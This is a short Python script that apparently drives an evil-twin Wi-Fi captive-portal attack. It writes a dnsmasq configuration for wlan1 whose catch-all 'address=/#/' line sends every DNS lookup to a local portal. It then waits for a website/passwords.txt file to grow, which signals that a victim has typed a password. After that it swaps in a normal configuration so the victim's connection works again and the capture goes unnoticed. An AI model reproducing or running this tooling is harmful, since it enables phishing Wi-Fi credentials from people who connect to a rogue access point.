import time
import subprocess
import shlex

from sympy import arg

def count_file_chars():
    char_count = 0
    with open('./website/passwords.txt', 'r') as file:
        content = file.read().replace(" ", "")
        char_count = len(content)
    return char_count


def create_dnsconf_captive():
    with open('./config/dns.conf', "w") as file:
        file.write("interface=wlan1\n")
        file.write("dhcp-range=10.100.101.2, 10.100.101.30, 255.255.255.0, 12h\n")
        file.write("dhcp-option=3,10.100.101.1 \n")
        file.write("dhcp-option=6,10.100.101.1 \n")
        file.write("server=8.8.8.8\n")
        file.write("log-queries\n")
        file.write("log-dhcp\n")
        file.write("listen-address=127.0.0.1\n")
        file.write("clear-on-reload\n")
        file.write("address=/#/10.100.101.1")
        

def overwrite_dnsconf():
    with open('./config/dns.conf', "w") as file:
        file.write("interface=wlan1\n")
        file.write("dhcp-range=10.100.101.2, 10.100.101.30, 255.255.255.0, 12h\n")
        file.write("dhcp-option=3,10.100.101.1 \n")
        file.write("dhcp-option=6,10.100.101.1 \n")
        file.write("server=8.8.8.8\n")
        file.write("log-queries\n")
        file.write("log-dhcp\n")
        file.write("listen-address=127.0.0.1\n")
        file.write("clear-on-reload")


current_count = count_file_chars()
create_dnsconf_captive()
args = shlex.split("dnsmasq -C config/dns.conf -d")
p = subprocess.Popen(args, stdout=subprocess.PIPE)
# out, err = p.communicate()
# print(out)
print("111")

while current_count == count_file_chars():
    print("Waiting for password")
    time.sleep(1)

p.kill()
overwrite_dnsconf()
p = subprocess.Popen(args, stdout=subprocess.PIPE)
out, err = p.communicate()
print(out)
print("ENDDDDD")